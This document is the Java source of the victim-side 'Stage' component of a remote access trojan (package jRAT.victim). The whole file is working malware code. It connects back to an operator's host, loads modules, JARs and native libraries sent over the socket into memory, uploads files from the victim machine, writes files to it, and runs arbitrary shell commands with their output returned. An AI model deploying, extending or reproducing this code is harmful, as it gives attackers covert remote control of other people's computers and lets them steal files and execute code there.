package jRAT.victim;

import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.Socket;
import java.net.SocketException;
import java.util.Arrays;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.jar.JarEntry;
import java.util.jar.JarInputStream;
import java.util.zip.ZipEntry;


public class Stage extends ClassLoader implements Runnable {
    
    private static final int VICTIM_ARCHITECTURE_UNKNOWN   = -1;
    private static final int VICTIM_ARCHITECTURE_WIN_32    = 0;
    private static final int VICTIM_ARCHITECTURE_WIN_64    = 1;
    private static final int VICTIM_ARCHITECTURE_LINUX_32  = 2;
    private static final int VICTIM_ARCHITECTURE_LINUX_64  = 3;
    private static final int VICTIM_ARCHITECTURE_LINUX_ARM = 4;
    private static final int VICTIM_ARCHITECTURE_MAC_OS_32 = 5;
    private static final int VICTIM_ARCHITECTURE_MAC_OS_64 = 6;
    
    private static final int DEPENDENCY_TYPE_JAR           = 0;
    private static final int DEPENDENCY_TYPE_CLASS         = 1;
    private static final int DEPENDENCY_TYPE_SHARED_LIB    = 2;
    
    private static Map<String, Class> loadedModules        = new HashMap<String, Class>();
    private static Map<String, Class> loadedDependencies   = new HashMap<String, Class>();
    private static Map<String, String> sharedLibraryPaths  = new HashMap<String, String>();

    private static int BUFFER_SIZE                         = 1024;
    private static String  HOST                            = null;
    private static Integer PORT                            = null;
    
    private static Class backgroundExecutorClass           = null;
    private static Stage stage                             = null;

    /* Various getter methods used from modules */
    public static Integer getPort()                                   { return PORT; }
    public static String getHost()                                    { return HOST; }
    public static String getSharedLibraryPath(String moduleName)      { return sharedLibraryPaths.get(moduleName); }
    public static Class getDependencyClassReference(String className) { return loadedDependencies.get(className); }
    
    private Stage() {}

    /* ----------------------------------------------------------------------------------------------------------------------- */

    /* init method is used to run the Stage in the same thread,
     * which is useful if running the program as a standalone
     * payload.
     */
    public static Stage init(String host, int port)
    {
        if (stage == null)
        {
            stage = new Stage();
            HOST  = host;
            PORT  = port;

            try { startClient(HOST, PORT); }
            catch (Exception ex) {}
        }
        return stage;
    }

    /* ----------------------------------------------------------------------------------------------------------------------- */
    
    /* bginit method is used to run the Stage in the background thread */
    public static Stage bginit(String host, int port)
    {
        if (stage == null)
        {
            stage = new Stage();
            HOST  = host;
            PORT  = port;
            new Thread(stage).start();
        }
        return stage;
    }
    
    /* ----------------------------------------------------------------------------------------------------------------------- */
    
    @Override
    public void run()
    {
        try { startClient(HOST, PORT); }
        catch (Exception ex) {}
    }
    
    /* ----------------------------------------------------------------------------------------------------------------------- */
    /* ----------------------------------------------------------------------------------------------------------------------- */
    /* ----------------------------------------------------------------------------------------------------------------------- */
    /* ----------------------------------------------------------------------------------------------------------------------- */

    public static void startClient(String host, int port) throws SocketException, IOException
    {
        Socket socket           = new Socket(host, port);
        DataInputStream input   = new DataInputStream(socket.getInputStream());
        DataOutputStream output = new DataOutputStream(socket.getOutputStream());

        /* Send hello message that creates main
         * client handler thread on the server
         */
        output.writeUTF("HELLO");

        /* Read the BackgroundExecutor bytes first.
         * BackgroundExecutor class is used for those methods
         * in modules that need to be run in a separate thread.
         */
        long rawBGExecutorClassSize = input.readLong();
        byte[] rawBGExecutorClassBytes = new byte[(int)rawBGExecutorClassSize];
        input.readFully(rawBGExecutorClassBytes);
        backgroundExecutorClass = stage.defineClass("jRAT.victim.BackgroundExecutor", rawBGExecutorClassBytes, 0, rawBGExecutorClassBytes.length);


        while (true)
        {
            String command      = input.readUTF().trim();
            String testCommand  = command.toUpperCase();

            if (testCommand.equals("QUIT"))
            {
                break;
            }

            /* --------------------------------------------------------------------------------------------------------------- */

            else if (testCommand.equals("SHOW"))
            {
                try
                {
                    ByteArrayOutputStream buffer = new ByteArrayOutputStream();
                    for (Map.Entry<String, Class> entry : loadedModules.entrySet())
                    {
                        String moduleName = entry.getKey();
                        Class moduleClass = entry.getValue();

                        byte[] partialResponse = (byte[]) moduleClass.getMethod("showModuleInfo", new Class[0]).invoke(null, new Object[0]);
                        if (partialResponse == null)
                            throw new Exception();
                        else
                            buffer.write(partialResponse);
                    }

                    byte[] response = buffer.toByteArray();
                    if (response.length == 0)
                        output.writeUTF("No modules loaded!");
                    else
                    {
                        output.writeUTF("OK");
                        output.writeLong(response.length);
                        output.write(response);
                    }
                }
                catch (Exception ex) { output.writeUTF("[] showModuleInfo call failed!"); }
            }

            /* --------------------------------------------------------------------------------------------------------------- */

            else if (testCommand.startsWith("SHOW"))
            {
                final String[] commandSections = command.split(" ");
                if (commandSections.length == 2)
                {
                    String moduleName = commandSections[1];
                    Class moduleClass = loadedModules.get(moduleName);
                    if (moduleClass == null)
                    {
                        output.writeUTF("[" + moduleName + "] module not loaded!");
                    }
                    else
                    {
                        try
                        {
                            byte[] response = (byte[]) moduleClass.getMethod("showModuleInfo", new Class[0]).invoke(null, new Object[0]);
                            if (response == null)
                                output.writeUTF("[" + moduleName + "] showModuleInfo call failed!");
                            else
                            {
                                output.writeUTF("OK");
                                output.writeLong(response.length);
                                output.write(response);
                            }
                        }
                        catch (Exception ex) { output.writeUTF("[" + moduleName + "] showModuleInfo call failed!"); }
                    }
                }
            }

            /* --------------------------------------------------------------------------------------------------------------- */

            else if (testCommand.startsWith("LOAD"))
            {
                final String[] commandSections = command.split(" ");
                if (commandSections.length == 2)
                {
                    String moduleName = commandSections[1];
                    Class moduleClass = loadedModules.get(moduleName);
                    if (moduleClass != null)
                    {
                        output.writeUTF("HAVE");
                    }
                    else
                    {
                        /* In case class still exists in the VM return a OK
                         * response and store the class into loadedModules again
                         * so that the module is available again for use in other
                         * commands.
                         */
                        Class targetClass = stage.findLoadedClass(moduleName);
                        if (targetClass != null)
                        {
                            output.writeUTF("OK");
                            loadedModules.put(moduleName, targetClass);
                            continue;
                        }

                        output.writeUTF("SEND");


                        // Load dependencies if they exist
                        // -------------------------------
                        /* Send the architecture first in case
                         * dependency contains a shared library
                         */
                        output.writeInt(getArchitecture());

                        String response = "OK";
                        int numDependencies = input.readInt();
                        for (int i = 0; i < numDependencies; i++)
                        {
                            int depdendencyType       = input.readInt();
                            String dependencyName     = input.readUTF();                            
                            long dependencySize       = input.readLong();
                            byte[] rawDependencyBytes = new byte[(int)dependencySize];
                            input.readFully(rawDependencyBytes);

                            switch (depdendencyType)
                            {
                                case DEPENDENCY_TYPE_JAR:
                                    response = loadJarFromMemory(rawDependencyBytes);
                                    break;
                                case DEPENDENCY_TYPE_CLASS:
                                    response = loadClassFromMemory(dependencyName, rawDependencyBytes);
                                    break;
                                case DEPENDENCY_TYPE_SHARED_LIB:
                                    response = loadSharedLibFromMemory(moduleName, dependencyName, rawDependencyBytes);
                                    break;
                            }

                            output.writeUTF(response);
                            if (!response.equals("OK"))
                                break;
                        }
                        if (!response.equals("OK"))
                            continue;
                        

                        // Load module
                        // -----------
                        long rawClassSize = input.readLong();
                        byte[] rawClassBytes = new byte[(int)rawClassSize];
                        input.readFully(rawClassBytes);
                        Class regeneratedClass = stage.defineClass(moduleName, rawClassBytes, 0, rawClassBytes.length);

                        /* Initiate module with the necessary information
                         * by passing the reference to Stage as a parameter.
                         */                     
                        try
                        {
                            regeneratedClass.getMethod("init", new Class[] { Class.class }).invoke(null, new Object[] { stage.getClass() });                            
                            loadedModules.put(moduleName, regeneratedClass);
                            output.writeUTF("OK");
                        }
                        catch (Exception ex) { output.writeUTF("NOK"); }                    
                    }
                }
            }

            /* --------------------------------------------------------------------------------------------------------------- */

            else if (testCommand.startsWith("UNLOAD"))
            {
                final String[] commandSections = command.split(" ");
                if (commandSections.length == 2)
                {
                    String moduleName = commandSections[1];
                    loadedModules.remove(moduleName);
                    output.writeUTF("OK");
                }
            }

            /* --------------------------------------------------------------------------------------------------------------- */

            else if (testCommand.equals("DEPS"))
            {
                StringBuilder responseBuilder = new StringBuilder();
                responseBuilder.append("*** Loaded dependencies ***\n");

                Set<String> keySet = loadedDependencies.keySet();
                if (keySet != null && keySet.size() > 0)
                {
                    String[] loadedDependencyNames = keySet.toArray(new String[0]);
                    Arrays.sort(loadedDependencyNames);
                    for (int i = 0; i < loadedDependencyNames.length; i++)
                    {
                        responseBuilder.append(loadedDependencyNames[i] + "\n");
                    }
                }

                responseBuilder.append("\n");
                byte[] response = responseBuilder.toString().getBytes("UTF-8");
                output.writeUTF("OK");
                output.writeLong(response.length);
                output.write(response);
                output.flush();
            }

            /* --------------------------------------------------------------------------------------------------------------- */

            else if (testCommand.startsWith("GET"))
            {
                final String[] commandSections = command.split(" (?=([^\"]*\"[^\"]*\")*[^\"]*$)");
                if (commandSections.length == 2)
                {
                    String filePath = commandSections[1];
                    byte[] rawFileBytes = readBinaryFileIntoByteArray(filePath);
                    if (rawFileBytes == null || rawFileBytes.length == 0)
                        output.writeUTF("NOK");
                    else
                    {
                        output.writeUTF("OK");
                        output.writeLong(rawFileBytes.length);
                        output.write(rawFileBytes);
                        output.flush();
                    }
                }
            }

            /* --------------------------------------------------------------------------------------------------------------- */

            else if (testCommand.startsWith("PUT"))
            {
                final String[] commandSections = command.split(" (?=([^\"]*\"[^\"]*\")*[^\"]*$)");
                if (commandSections.length == 2)
                {
                    String filePath = commandSections[1];
                    long fileSize = input.readLong();
                    byte[] rawFileBytes = new byte[(int)fileSize];
                    input.readFully(rawFileBytes);
                    boolean status = writeByteArrayToBinaryFile(filePath, rawFileBytes);
                    if (status)
                        output.writeUTF("OK");
                    else
                        output.writeUTF("NOK");
                }
            }

            /* --------------------------------------------------------------------------------------------------------------- */

            else if (testCommand.startsWith("RUN"))
            {
                final String[] commandSections = command.split(" (?=([^\"]*\"[^\"]*\")*[^\"]*$)");
                if (commandSections.length >= 3)
                {
                    String moduleName = commandSections[1];
                    String methodName = commandSections[2];

                    Class moduleClass = loadedModules.get(moduleName);
                    if (moduleClass == null)
                    {
                        output.writeUTF("[" + moduleName + "] module not loaded!");
                    }
                    else
                    {
                        int numArgs = (commandSections.length - 3);

                        Class[] methodArgTypes = new Class[numArgs];
                        Object[] methodArgs    = new Object[numArgs];
        
                        for (int i = 0; i < numArgs; i++)
                        {
                            methodArgTypes[i] = String.class;
                            methodArgs[i]     = commandSections[i+3].replaceAll("\"", "");
                        }


                        // CHECKING IF A METHOD SHOULD BE RUN IN A BACKGROUND THREAD
                        // ---------------------------------------------------------
                        boolean runInBackground = false;
                        try
                        {
                            runInBackground = (boolean) moduleClass.getMethod("isBackgroundMethod", new Class[] { String.class }).invoke(null, new Object [] { methodName });
                        }
                        catch (Exception ex)
                        {
                            output.writeUTF("[" + moduleName + "] " + methodName + " call failed!");
                            continue;
                        }


                        // RUNNING A METHOD IN A NEW THREAD
                        // --------------------------------
                        if (runInBackground)
                        {
                            String returnStatus = "OK";
                            try
                            {
                                Class[] threadArgs = new Class[4];  // Constructor has 4 arguments
                                threadArgs[0] = Class.class;        // Class object which contains the method to be executed
                                threadArgs[1] = String.class;       // The method to execute
                                threadArgs[2] = Class[].class;      // Types of arguments the method accepts (all are String for simplicity)
                                threadArgs[3] = Object[].class;     // Method arguments
                                Thread thread = (Thread) backgroundExecutorClass.getDeclaredConstructor(threadArgs).newInstance(moduleClass, methodName, methodArgTypes, methodArgs);
                                thread.start();
                            }
                            catch (Exception ex) { returnStatus = "NOK"; }
                            output.writeUTF(returnStatus);

                            if (returnStatus.equals("OK"))
                            {
                                byte[] response = new String("Background thread started!").getBytes("UTF-8");
                                output.writeLong(response.length);
                                output.write(response);
                            }
                        }


                        // RUNNING A METHOD IN THE SAME THREAD
                        // -----------------------------------
                        else
                        {
                            try
                            {
                                byte[] response = (byte[]) moduleClass.getMethod(methodName, methodArgTypes).invoke(null, methodArgs);
                                if (response == null)
                                {
                                    output.writeUTF("[" + moduleName + "] " + methodName + " call failed!");
                                }
                                else
                                {
                                    output.writeUTF("OK");
                                    output.writeLong(response.length);
                                    output.write(response);
                                }
                            }
                            catch (Exception ex) { output.writeUTF("[" + moduleName + "] " + methodName + " call failed!"); }
                        }
                    }
                }
            }

            /* --------------------------------------------------------------------------------------------------------------- */

            else
            {
                byte[] response = exec(command);
                if (response != null)
                {
                    output.writeUTF("OK");
                    output.writeLong(response.length);
                    output.write(response);
                }
                else { output.writeUTF(command + " call failed!"); }
            }

            /* --------------------------------------------------------------------------------------------------------------- */
        }

        input.close();
        output.close();
        socket.close();
    }

    /* ----------------------------------------------------------------------------------------------------------------------- */
    /* ----------------------------------------------------------------------------------------------------------------------- */
    /*                                  SUPPORT FOR LOADING SHARED LIBRARIES FROM MEMORY                                       */
    /* ----------------------------------------------------------------------------------------------------------------------- */
    /* ----------------------------------------------------------------------------------------------------------------------- */

    public static String loadSharedLibFromMemory(String moduleName, String libraryName, byte[] rawLibraryBytes)
    {
        FileOutputStream output = null;
        try
        {
            File temp = File.createTempFile(libraryName, "");       
            boolean status = writeByteArrayToBinaryFile(temp.getAbsolutePath(), rawLibraryBytes);
            if (status)
            {
                /* Save shared library path to a map in this class so that it can be
                 * accessed and loaded using the init method in the module being loaded.
                 * Shared libraries are loaded in the init method of a module in case
                 * any additional setup needs to be done.
                 */                 
                sharedLibraryPaths.put(moduleName, temp.getAbsolutePath());
                return "OK";
            }
            else { return "NOK"; }
        }
        catch (Exception ex) { return "NOK"; }
    }
    
    /* ----------------------------------------------------------------------------------------------------------------------- */
    /* ----------------------------------------------------------------------------------------------------------------------- */
    /*                                  SUPPORT FOR LOADING CLASS DEPENDENCIES FROM MEMORY                                     */   
    /* ----------------------------------------------------------------------------------------------------------------------- */
    /* ----------------------------------------------------------------------------------------------------------------------- */

    public static String loadClassFromMemory(String className, byte[] rawClassBytes)
    {
        try
        {
            Class targetClass = stage.findLoadedClass(className);
            if (targetClass == null)
            {
                targetClass = stage.defineClass(className, rawClassBytes, 0, rawClassBytes.length);
            }
            loadedDependencies.put(targetClass.getName(), targetClass);
            return "OK";
        }
        catch (Exception ex) { return "NOK"; }
    }
    
    /* ----------------------------------------------------------------------------------------------------------------------- */
    /* ----------------------------------------------------------------------------------------------------------------------- */
    /*                                  SUPPORT FOR LOADING JAR DEPENDENCIES FROM MEMORY                                       */   
    /* ----------------------------------------------------------------------------------------------------------------------- */
    /* ----------------------------------------------------------------------------------------------------------------------- */

    public static String loadJarFromMemory(byte[] jarBytes)
    {
        JarInputStream input            = null;
        String returnMessage            = "OK";
        String currentDependencyName    = null;         
        List<String> classesToLoad      = null;
        try
        {
            classesToLoad = extractClassNames(jarBytes);
            if (classesToLoad == null || classesToLoad.isEmpty())
                return "NOK";

            OUTER: while (true)
            {
                input = new JarInputStream(new ByteArrayInputStream(jarBytes));
                INNER: while (true)
                {
                    JarEntry currentEntry = input.getNextJarEntry();
                    if (currentEntry == null)
                        break;
                    
                    if (!currentEntry.getName().endsWith(".class"))
                        continue;

                    String finalClassName = currentEntry.getName().replaceAll("/", ".").replaceAll(".class", "");   
                    if (classesToLoad.contains(finalClassName))
                    {
                        /* If there is a dependency that we are searching
                         * for skip other records until we find it
                         */
                        if (currentDependencyName != null && !currentDependencyName.equals(finalClassName))
                            continue;
                        
                        Class targetClass = stage.findLoadedClass(finalClassName);
                        if (targetClass == null)
                        {
                            try
                            {
                                byte[] rawClassBytes = readClassBytes(input, currentEntry);
                                targetClass = stage.defineClass(finalClassName, rawClassBytes, 0, rawClassBytes.length);
                                classesToLoad.remove(finalClassName);
                                currentDependencyName = null;                           
                            }
                            catch (NoClassDefFoundError ex)
                            {
                                /* If this is an external dependency break out of the
                                 * loop and return the dependency name from the method
                                 */
                                String dependencyName = ex.getMessage().replaceAll("/", ".");
                                if (!classesToLoad.contains(dependencyName))
                                {
                                    returnMessage = "Missing external dependency => " + dependencyName;
                                    break OUTER;
                                }
                                else { currentDependencyName = dependencyName; }
                            }
                        }
                        /* Class is already loaded so simply
                         * remove it from classesToLoad list
                         */
                        else { classesToLoad.remove(finalClassName); }
                        
                        if (targetClass != null)
                            loadedDependencies.put(targetClass.getName(), targetClass);
                    }
                }
                input.close();
                if (classesToLoad.isEmpty())
                    break;              
            }
        }
        catch (Exception ex) { ex.printStackTrace(); returnMessage = "NOK"; }
        finally
        {
            try { if (input != null) input.close(); }
            catch (Exception ex) {}
        }
        return returnMessage;
    }

    /* ---------------------------------------------------------------------------------------------------------- */

    public static List<String> extractClassNames(byte[] jarBytes)
    {
        List<String> classesToLoad = new LinkedList<String>();
        try
        {
            JarInputStream input = new JarInputStream(new ByteArrayInputStream(jarBytes));
            while (true)
            {
                JarEntry currentEntry = input.getNextJarEntry();
                if (currentEntry == null)
                    break;
                
                if (!currentEntry.getName().endsWith(".class"))
                    continue;

                if (currentEntry.getName().toLowerCase().endsWith("module-info.class"))
                    continue;
                    
                String finalClassName = currentEntry.getName().replaceAll("/", ".").replaceAll(".class", "");
                classesToLoad.add(finalClassName);
            }
            input.close();
        }
        catch (Exception ex) { classesToLoad = null; }
        return classesToLoad;
    }

    /* ---------------------------------------------------------------------------------------------------------- */

    private static byte[] readClassBytes(InputStream in, ZipEntry entry) throws IOException
    {
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        long size = entry.getSize();
        if (size > -1)
        {
            byte[] buffer = new byte[BUFFER_SIZE];
            int n = 0;
            long count = 0;
            while (-1 != (n = in.read(buffer)) && count < size)
            {
                output.write(buffer, 0, n);
                count += n;
            }
        }
        else
        {
            while (true) 
            {
                int b = in.read();
                if (b == -1)
                    break;
                output.write(b);
            }
        }
        output.close();
        return output.toByteArray();
    }
    
    /* ----------------------------------------------------------------------------------------------------------------------- */
    /* ----------------------------------------------------------------------------------------------------------------------- */
    /*                                                  HELPER METHODS                                                         */
    /* ----------------------------------------------------------------------------------------------------------------------- */
    /* ----------------------------------------------------------------------------------------------------------------------- */
    
    public static byte[] exec(String command) throws UnsupportedEncodingException
    {
        String result = null;
        StringBuilder resultBuilder = new StringBuilder();
        BufferedReader processInputStream = null;
        BufferedReader processErrorStream = null;
        try
        {
            final Process process = Runtime.getRuntime().exec(command);
            process.waitFor();
            processInputStream = new BufferedReader(new InputStreamReader(process.getInputStream()));
            processErrorStream = new BufferedReader(new InputStreamReader(process.getErrorStream()));

            String currentLine;
            while ((currentLine = processInputStream.readLine()) != null) { resultBuilder.append(currentLine + "\n"); }
            while ((currentLine = processErrorStream.readLine()) != null) { resultBuilder.append(currentLine + "\n"); }

            result = resultBuilder.toString();
        }
        catch (Exception ex) {}
        finally
        {
            try
            {
                if (processInputStream != null)
                    processInputStream.close();

                if (processErrorStream != null)
                    processErrorStream.close();
            }
            catch (Exception ex) {}
        }

        if (result != null)
            return result.getBytes("UTF-8");
        else
            return null;
    }

    /* ---------------------------------------------------------------------------------------------------------- */

    private static byte[] readBinaryFileIntoByteArray(String filePath)
    {
        byte[] rawFileBytes = null;
        FileInputStream input = null;
        ByteArrayOutputStream output = null;
        try
        {
            input = new FileInputStream(new File(filePath));
            output = new ByteArrayOutputStream();

            final byte[] buffer = new byte[BUFFER_SIZE];
            int numberOfBytesRead;
            while ((numberOfBytesRead = input.read(buffer)) != -1)
            {
                output.write(buffer, 0, numberOfBytesRead);
            }
            output.flush();
            rawFileBytes = output.toByteArray();
        }
        catch (Exception ex) {}
        finally
        {
            try { if (input != null) input.close(); }
            catch (Exception ex) {}

            try { if (output != null) output.close(); }
            catch (Exception ex) {}
        }
        return rawFileBytes;
    }

    /* ---------------------------------------------------------------------------------------------------------- */

    private static boolean writeByteArrayToBinaryFile(String filePath, byte[] data)
    {
        boolean STATUS = true;
        ByteArrayInputStream input = null;
        FileOutputStream output = null;
        try
        {
            input  = new ByteArrayInputStream(data);
            output = new FileOutputStream(new File(filePath));

            final byte[] buffer = new byte[BUFFER_SIZE];
            int numberOfBytesRead;
            while ((numberOfBytesRead = input.read(buffer)) != -1)
            {
                output.write(buffer, 0, numberOfBytesRead);
            }
            output.flush();
        }
        catch (Exception ex) { STATUS = false; }
        finally
        {
            try { if (input != null) input.close(); }
            catch (Exception ex) {}

            try { if (output != null) output.close(); }
            catch (Exception ex) {}  
        }
        return STATUS;
    }

    /* ----------------------------------------------------------------------------------------------------------------------- */

    private static int getArchitecture()
    {
        String tempOSName = System.getProperty("os.name").toLowerCase();
        String tempOSArch = System.getProperty("os.arch").toLowerCase();
        
        if (tempOSName.contains("win"))
        {
            if (tempOSArch.contains("amd64"))
                return VICTIM_ARCHITECTURE_WIN_64;
            else
                return VICTIM_ARCHITECTURE_WIN_32;
        }
        else if (tempOSName.contains("mac"))
        {
            if (tempOSArch.contains("amd64"))
                return VICTIM_ARCHITECTURE_MAC_OS_64;
            else
                return VICTIM_ARCHITECTURE_MAC_OS_32;
        }
        else if (tempOSName.contains("nix") || tempOSName.contains("nux") || tempOSName.contains("aix"))
        {
            if (tempOSArch.contains("amd64"))
                return VICTIM_ARCHITECTURE_LINUX_64;
            else if (tempOSArch.contains("x86"))
                return VICTIM_ARCHITECTURE_LINUX_32;
            else
                return VICTIM_ARCHITECTURE_LINUX_ARM;
        }
        else
        {
            return VICTIM_ARCHITECTURE_UNKNOWN;
        }
    }

    /* ----------------------------------------------------------------------------------------------------------------------- */

}
